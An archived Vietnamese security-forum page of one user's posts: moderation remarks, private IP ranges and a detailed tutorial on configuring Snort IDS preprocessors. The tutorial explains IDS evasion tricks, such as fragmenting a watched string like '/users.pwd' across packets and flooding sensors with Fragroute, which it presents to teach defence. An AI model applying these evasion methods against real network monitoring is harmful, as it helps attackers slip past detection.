<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by Mulan, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by Mulan - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/761.html" name="top" class="maintitle" id="top">Messages posted by: Mulan</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/761.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/761.html">Profile for Mulan</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/761.html">Messages posted by Mulan</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">13</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1891.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1891/9780.html#9780,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Đây là các câu hỏi chứ không còn là trao đổi nữa, có vẻ như quá nhiều nhỉ?<br/> Sẽ mất thời gian để mổ sẻ nhưng nếu để ăn sổi kiểu hạ gục càng nhanh càng tốt thì mình cũng không biết <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1209.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1209/6056.html#6056,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><blockquote> Private IP là dãy IP được dùng trong mạng LAN :<br/> 10.0.0.x<br/> 172.16.0.0  172.31.255.255<br/> 192.168.x.x<br/> Dãy IP này không có thực trên Internet. &nbsp;
</blockquote><br/><br/> Private IP Address:<br/> Lớp A: 10.0.0.0 ---&gt; 10.255.255.255<br/> Lớp B: 172.16.0.0 ---&gt; 172.31.255.255<br/> Lớp C: 192.168.0.0 ---&gt; 192.168.255.255</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/156.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/156/5410.html#5410,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Có cần anh attach luôn cái source anh Save của Th3 W@tch3r không. Lần sau nói linh tinh anh xoá bài đấy.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/418.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/418/3107.html#3107,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Chủ đề chệch hướng rồi.<br/> Lock vào nhá các đồng chí.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/5.html">Góp ý và Hỏi đáp thắc mắc chung</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/592.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/592/2013.html#2013,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Thay mặt admin, rất tiếc không đáp ứng được yêu cầu của bạn.<br/> Mong bạn vui lòng sử dụng account mới.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/5.html">Góp ý và Hỏi đáp thắc mắc chung</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/485.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/485/1381.html#1381,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">FF cho Windows thì không gõ được.<br/> Anh conmale chắc dùng FF trên Linux.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/157.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/157/1239.html#1239,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Nếu các Reply không có tính chất xây dựng bài viết trong các box Kỹ Thuật thì tôi sẽ xóa đấy.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/5.html">Góp ý và Hỏi đáp thắc mắc chung</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/424.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/424/1057.html#1057,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Bình đẳng hết, Không ai còn được gọi là "có chức vụ" gì nữa <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/155.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/155/1027.html#1027,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Bài viết có tính chất tham khảo của bạn Hackett từ lâu rồi.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/167.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/167/572.html#572,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><b><font color='violet'>2.4.3 Cấu hình tiền xử lý (preprocessor)</font></b><br/><br/> Tiền xử lý phục vụ cho nhiều mục đích. Nó “bình thường hoá” traffic cho các services, để chắc chắn rằng dữ liệu trong các packet Snort đang theo dõi sẽ có cơ hội tốt nhất để so sánh với các tín hiệu nhận dạng (signatures ) mà Snort đuợc trang bị. Chức năng khác của quá trình tiền xử lý là tự phòng thủ. Các cuộc tấn công được phát triển để lẩn tránh hoặc làm tràn ngập NIDS sensor, vì thế attacker có thể lợi dụng làm những công việc mình cần. Chức năng frag2 và stream4 tiền xử lý có chức năng chính để chống lại các phương pháp này.<br/> Và chức năng cuối cùng cũng là chức năng quan trọng nhất là làm cho Snort có thêm chút thông minh để phát hiện ra các cuộc tấn công mang phong cách không bình thuờng mà Snort không được trang bị trong rules.<br/><br/> Mô hình các gói tin đi vào ở mode preprocessor<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136455634_thumb.jpg' border="0" /></div><br/><br/> 2.4.3.1 FLOW<br/><br/> Flow preprocessor có một module là flow-portscan. Flow theo dõi tất cả traffic và giữ các track kết nối giữa hệ thống và port lạ, khi có 1 flow lạ mới thông tin sẽ chuyển qua hash (làm cho các track nhỏ hơn , nhanh hơn trong tracking các địa chỉ IP và PORTS) được lưu trữ trong bảng bộ nhớ dành sẵn. Các option cho flow preprocessor<br/><br/> Memcap<br/><br/> Chỉ định mức tối đa cho bộ nhớ khi tracking, mặc định là 10MB, thông số này để điều khỉên bộ nhớ của Snort khi cần<br/><br/> Rows<br/><br/> Chỉ định số dòng trên bảng hash, mặc định là 4,099 dòng<br/><br/> Stats_interval<br/><br/> Có thể chuyển tình trạng của flow preprocessor qua stdout, giá trị là một số nguyên đại diện cho thời gian tính bằng giây (s) , rất hữu ích khi dùng cho mục đích test<br/><br/> Hash<br/> Phương pháp sử dụng hash thông tin vào bảng, có thể set hash có giá trị là 1 (byte) hoặc 2 (số nguyên ) dùng hash 2 nhanh hơn<br/><br/> Đây là cấu hình khuyên của các nhà phát triên dùng cho flow:<br/><br/> Preprocessor flow: stats_interval 0 hash 2<br/><br/> 2.4.3.2 frag2<br/><br/> Khi một packet đi từ mạng này qua mạng khác, nó thường cần phân mảnh thành các packet nhỏ hơn, bởi vì mạng thứ 2 sẽ giới hạn kích thuớc của packet và tất nhiên nhỏ hơn mạng đầu tiên. Và tất cả các packet nhỏ sẽ đuợc sắp xếp lại khi đến nơi. Một trong những phương pháp của attacker là dùng các packet nhỏ để lừa firewall hoặc IDS. Ví dụ: rules của Snort đang dò tìm chuỗi /users.pwd trong các section của packet, một attacker có thể tạo ra một dãy các packet rất nhỏ chỉ chứa vài byte trong data của packet, mảnh đầu tiên có thể chứa /user , và cái packet phân mảnh thứ 2 có thể chứa s.pwd, các packet này sẽ không kích hoạt báo động bởi vì nó không giống các rules nào cả, frag2 preprocessor sẽ sắp xếp sự phân mảnh này vào chung và nó sẽ dễ dàng phát hiện sự ẩn dấu đó. Hoặc một ví dụ khác các attacker có thể đưa ra 1 dung lượng quá lớn các packet đã phân mảnh nó sẽ chiếm dung lưonng của hệ thống và làm overload có thể Snort sẽ từ chối tất cả và ảnh hưởng tới các packet không liên quan, các tools mà attacker thường dùng là Fragroute, frag2 có các options để chống lại các dạng tấn công này<br/><br/> Timeout:<br/><br/> Số dây trước khi tắt các sension để flush lại bộ nhớ, mặc định là 60s<br/><br/> Memcap<br/><br/> Số luợng bytes của memory set aside, mặc định là 4MB<br/><br/> Detect_state_problems<br/><br/> Bật chức năng báo động khi phát hiện điều kiện không bình thường trong các packet phân mảnh, nó nên được bật cho hầu hết các trường hợp<br/><br/> Min_ttl<br/><br/> Thiết lập time to live (TTL) tối thiểu đuợc chấp nhận của tiền xử lý, mặc định là 0<br/><br/> Ttl_limit<br/><br/> Thiết lập ttl maximum, nó không nên quá lớn ,mặc định là 5<br/><br/> Thiết lập khuyến cáo nên dùng:<br/><br/> Preprocessor frag2<br/><br/> 2.4.3.3 stream4<br/><br/> stream4 được thiết kế để bảo vệ Snort từ 1 dạng tấn công mới của attacker tới các NIDS sensor bằng cách gửi tràn ngập các packet chứa các chuỗi dữ liệu giống như trong rules để kích các báo động, cũng có khá nhiều tools dùng cho việc này nhưng Snort của có cách chống lại.<br/><br/> stream4 có 2 nhiệm vụ chính: sateful inspection ( kiểm tra tính nguyên ven ), awareness and session reassembly ( nhận biết và sắp xếp các session )<br/><br/> Các option của stream4<br/><br/> Detect_scans<br/><br/> Mặc định là tắt. nó sẽ báo động khi phát hiện các tools scan ports<br/><br/> Detect_state_problems<br/><br/> Mặc định tắt. sẽ báo động khi có vấn đề về tình trạng của cuộc thoại bị phát hiện<br/><br/> Disable_evasion_alerts<br/><br/> Cũng mặc định tắt luôn. nếu bật nó có thể phát hiện attacker đang cố gắng từ chối IDS bằng cách gởi các packet đuơc sắp xếp lộn xộn, hoặc các packet là SYN trong data<br/><br/> Min_ttl<br/><br/> Thiết lập thời gian sống ít nhất để chấp nhận các packet vào stream4 preprocessor<br/><br/> Ttl_limit<br/><br/> Giống như trong phần của frag2<br/><br/> keepstats [machine, binary]<br/><br/> Mặc định tắt, nếu bật nó sẽ hiển thị tình trạng các senssion đã theo dõi ở 2 chế độ machine là text file, định dạng binary và dùng tools barnyard để thống nhất<br/><br/> Noinspect<br/><br/> Mặc định cũng off. tắt chức năng statefull inspection của tất cả các packets<br/> Ta có thể tham khảo về các tiến trình stateful ở hình này<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136455673_thumb.jpg' border="0" /></div><br/><br/> Timeout mặc định là 30s<br/><br/> log_flushed_streams<br/><br/> Nếu một packet đang bị theo dõi và là nguyên nhân gây ra báo động, ta có thể dump session này và lưu thông tin từ stream4 vào đĩa cứng<br/><br/> Memcap<br/><br/> Giống phần frag2<br/><br/> Đây là câu lệnh khuyến cáo nên dùng<br/><br/> preprocessor stream4: detect scans, disable_evasion_alerts, timeout 60, ttl_limit 10<br/><br/> 2.4.3.4 stream4_reassemble<br/><br/> Snort phản hồi những chuỗi kí tự nó đọc đuợc trong các gói tin đi qua nếu nó trùng với các kí tự nhận dạng trong signatures. Nếu attacker có thể phân chia các kí tự thành nhiều gói tin để tránh báo động của Snort, stream4_reassemble đóng vài trò sắp xếp lại các traffic giữa 2 hệ thống đàm thoại ( conversation ) của network, gia tăng khả năng match các signatures<br/><br/> Các conversation network thường là các chương trình dùng bằng command line như Telnet, Ftp, Smtp có thể là các nguyên nhân nội dung của các packet lọt qua được hệ thống. Reassemble các traffic các services này là cần thiết để ngăn chặn các báo động lầm hoặc bỏ sót.<br/> Một kĩ thuật khác của attacker là nhúng các gói tin với các kí tự gây lỗi, reassemble vẫn có thể phát hiện được<br/><br/> Các option của reassemble<br/><br/> Clientonly<br/><br/> Chỉ bật chức năng này trên client<br/><br/> Serveronly<br/><br/> Chỉ bật chức năng này trên server<br/><br/> Both<br/><br/> Bật trên cả server và client<br/><br/> Noalerts<br/><br/> Chế độ báo động vẫn hoạt động nhưng chỉ tắt chức năng reassembly<br/><br/> Ports [list]<br/><br/> Chỉ định những ports cụ thể để reassembly<br/><br/> Câu lệnh khuyên dùng:<br/><br/> Preprocessor stream4_reassemble: both<br/><br/><br/> 2.4.3.5 Tiền xử lý các http inspect<br/><br/> Có nhiều cách thông tin có thể định dạng sang các http session và cũng có nhiều loại khác nhau biểu diễn các thông tin như là các http session như multimedia, .xml, .HTML, .asp, .php, .java,….và kết quả Snort phải “massage” nội dung của các HTTP conversation để định dạng lại data phục vụ cho quá trình phát hiện tốt nhất<br/><br/> Có 2 kiểu cấu hình http_inspect là global và server. Global ảnh huởng trực tiếp tới http traffic ,cấu hình Server chứa các phần setting cho 1 máy server và các group servers như vậy, cái này rất thường dùng để cấu hình cho web server dùng apache hoặc IIS<br/><br/> http_inspect ( global )<br/><br/> Có 3 option trong phần này dùng để config http traffic:<br/><br/> iis_unicode_map &lt;filename&gt; [codemap &lt;interger]<br/><br/> Chỉ đuờng dẫn tới map file unicode.map. Nó sẽ chỉ cho bộ tiền xử lý biết làm cách nào để map các kí tự unicode sang ASCII dạng text đê match các signatures. Ta phải chỉ ra code dể map ví dụ 1252 là latin code<br/><br/> detect_anomalous_servers<br/><br/> Sẽ báo động khi gặp các ports lạ không tiêu chuẩn. thường không bật chế độ này<br/><br/> proxy_alert<br/><br/> Nếu bạn sử dụng proxy server cho các internet user, bật chức năng này để giám sát các user không dùng proxy để kết nối internet<br/><br/> Đề nghị setting cho mode này:<br/><br/> preprocessor http_inspect: global iis_unicode_map unicode.map 1252<br/><br/> http_inspect_server<br/><br/> Có thể dùng option này cho servers bất kì hoặc các servers trong môi truờng làm việc của mình. hầu hết các administrator đều dùng 1 server riêng dùng cho IIS và cái khác dùng Apache servers. Trong phần trình bày này sẽ có ví dụ cụ thể.<br/><br/> Có 2 kiều cấu hình cho http_inspetct_server là “default” và “by IP address”, kiểu “default” chỉ cấu hình cho tất cả web traffic không liên quan gì đến IP address, còn kiểu “IP address” chỉ cấu hình cho các IP đựơc chỉ định hoặc 1 dãy các IP. Có các option là:<br/><br/> Default hoặc &lt; IP address &gt;<br/><br/> Như đã trình bày ở trên<br/><br/> Profile &lt;all | apache | iis &gt;<br/><br/> Có thể dùng apache hoặc chỉ dùng cho iis ta cũng có thể dùng all cho cả 2. Các bảng sau sẽ trình bày cụ thể của profile khi dùng từng loại<br/><br/> Bảng setting cho profile "all"<br/><br/><br/> Option Setting<br/><br/> flow_depth 300<br/> chunk_encoding Báo động khi các chunks lớn hơn 500,000 bytes<br/> lis_unicode_map Map sử dụng cho mode globle<br/> ascii No<br/> non_refc_char On<br/> multi_slash No<br/> directory No<br/> apache_whitespace Yes<br/> double_decode Yes<br/> j_encode Yes<br/> bare_byte Yes<br/> lis_unicode Yes<br/> lis_backslash No<br/> lis_delimiter Yes<br/><br/><br/> Bảng setting cho profile "apache"<br/><br/><br/> Option Setting<br/><br/> flow_depth 300<br/> chunk_encoding Báo động khi các chunks lớn hơn 500,000 bytes<br/> ascii No<br/> non_rfc_char On<br/> multi_slash No<br/> directory No<br/> apache_whitespace Yes<br/><br/><br/><br/> Bảng setting cho profile "iis"<br/><br/><br/> Option Setting<br/><br/> flow_depth 300<br/> lis_unicode_map Map sử dụng cho mode globle<br/> ascii No<br/> multi_slash No<br/> directory No<br/> double-decode Yes<br/> u_encode Yes<br/> bare_byte Yes<br/> lis_unicode Yes<br/> lis_backslash No<br/> lis_delimiter Yes<br/> apache_whitespace Yes<br/><br/> utf_8 No<br/> non_strict On<br/><br/><br/><br/> Đây là phần cấu hình mặc định cho http_inspect_server:<br/><br/> Preprocessor http_inspect_server: server default profile all ports {80 8080 }<br/><br/> Đây là phần cấu hình cho IIS server http_inspect_server :<br/><br/> Preprocessor http_inspect_server: server 10.10.10.33 profile iis ports { 80 8080 }<br/><br/> Còn đây là cấu hình điển hình cho Apache server:<br/><br/> Preprocessor http_inspect_server 10.1.1.125 profile apache ports { 80 8080 }<br/><br/> <b><font color='violet'>2.4.3.6 rpc_decode</font></b><br/><br/> RPC’s traffic có thể phân chia ra nhiều packet và mã hoá theo nhiều kiểu khác nhau. Rpc_decode preprocessor sẽ bình thường hoá các traffic này cũng chỉ mục đích giúp nhận diện tốt hơn trong singnatures list. List của các ports mà RPC services đang chạy đuợc cung cấp trong các dòng cấu hình. Ở đây có 4 options cho rpc_decode<br/><br/> Alert_fragments<br/><br/> Báo động khi có fragmented RPC traffic<br/><br/> No_alert_multiple_requests<br/><br/> Không báo động khi nhiều hơn một RPC request đuợc chứa trong một packet.<br/><br/> No_alert_large_fragments<br/><br/> RPC fragments có thể lớn hơn size của các fragment hiện hành. Nếu bạn tìm lỗi xác thực, ta phải dùng chức năng này để disable<br/><br/> No_alert_incomplete<br/><br/> RPC messages có thể rất lớn, có khi nó lớn hơn có MTU của mạng nó đang đi qua, nó có thể gây nhiều lỗi cho các RPC network services. Có thể tắt chức năng này để phát hiện lỗi<br/><br/> Đây là đề nghị config rpc_decode<br/><br/> Preprocessor rpc_decode: 111 32771 1024<br/><br/><br/> 2.4.3.7 bo<br/><br/> Bo- Back orifice con virust nổi tiếng của các hacker trong các năm qua, dùng để điều khiển từ xa các client bị nhiễm nó, Snort có option để ngăn chặn điều này và phát hiện khá dễ dàng chỉ bằng một dòng lệnh ngắn gọn.<br/>